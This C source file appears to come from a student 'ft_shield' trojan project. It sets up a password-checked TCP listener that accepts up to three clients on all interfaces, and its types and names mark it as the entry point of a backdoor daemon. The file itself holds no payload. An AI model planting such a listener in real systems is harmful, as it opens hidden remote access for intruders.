# include "../include/ft_shield.h"

int init_servsocket(t_troyan *shield)
{
    shield->opc = 1;

    shield->socketfd = socket(AF_INET, SOCK_STREAM, 0);
    if (shield->socketfd == -1)
        return (-1);
    if (setsockopt(shield->socketfd, SOL_SOCKET, SO_REUSEADDR, &shield->opc, sizeof(shield->opc)) == -1)
    {
        close(shield->socketfd);
        return (-1);
    }

    memset(&shield->target_addr, 0, sizeof(shield->target_addr));
    shield->target_addr.sin_family = AF_INET;
    shield->target_addr.sin_addr.s_addr = INADDR_ANY;            // Escuchar en cualquier interfaz
    shield->target_addr.sin_port = htons(PORT);                  // Convertir puerto al formato de red

    if (bind(shield->socketfd, (struct sockaddr *)&shield->target_addr, sizeof(shield->target_addr)) == -1)
    {
        close(shield->socketfd);
        return (-1);
    }

    if (listen(shield->socketfd, BACKLOG) == -1)
    {
        close(shield->socketfd);
        return (-1);
    }
    return (0);
}

void    ft_connection(t_troyan *shield, int socket_client)
{
    char    buffer[1024];
    int     bytes_read;

    (void)shield;
    bytes_read = recv(socket_client, buffer, sizeof(buffer) -1, 0);
    if (bytes_read > 0)
    {
        buffer[bytes_read] = '\0';
        buffer[strcspn(buffer, "\r\n")] = '\0';                 // Quitar los saltos de línea

        if (strcmp(buffer, PASSWORD) == 0)
            send(socket_client, "OK\n", 3, 0);
        else
            send(socket_client, "KO\n", 3, 0);
    }
    close(socket_client);
}

int loop_server(t_troyan *shield)
{
    fd_set              readfds;
    int                 i;
    int                 maxfd;
    int                 socket_client;
    int                 activity;
    int                 clients[3];
    int                 asigned = 0;
    struct sockaddr_in  addr_client;
    struct timeval      timeout;
    socklen_t           addr_len = sizeof(addr_client);

    memset(clients, 0, sizeof(clients));
    while (!g_sigint_received)
    {
        FD_ZERO(&readfds);
        FD_SET(shield->socketfd, &readfds);
        maxfd = shield->socketfd;

        for (i = 0; i < 3; i++)
        {
            if (clients[i] > 0)
            {
                FD_SET(clients[i], &readfds);
                if (clients[i] > maxfd)
                    maxfd = clients[i];
            }
        }

        timeout.tv_sec = 1;
        timeout.tv_usec = 0;

        activity = select(maxfd + 1, &readfds, NULL, NULL, &timeout);
        if (activity < 0)
        {
            if (errno == EINTR)
                continue;
            return (-1);
        }
        else if (activity == 0)
            continue;
        
        if (FD_ISSET(shield->socketfd, &readfds))
        {
            socket_client = accept(shield->socketfd, (struct sockaddr *)&addr_client, &addr_len);
            if (socket_client < 0)
                continue;
            asigned = 0;
            for (i = 0; i < 3; i++)
            {
                if (clients[i] == 0)
                {
                    clients[i] = socket_client;
                    asigned = 1;
                    break;
                }
            }
            if (asigned == 0)
                close(socket_client);
        }

        for (i = 0; i < 3; i++)
        {
            if (clients[i] > 0 && FD_ISSET(clients[i], &readfds))
            {
                ft_connection(shield, clients[i]);
                clients[i] = 0;
            }
        }
    }
    return (0);
}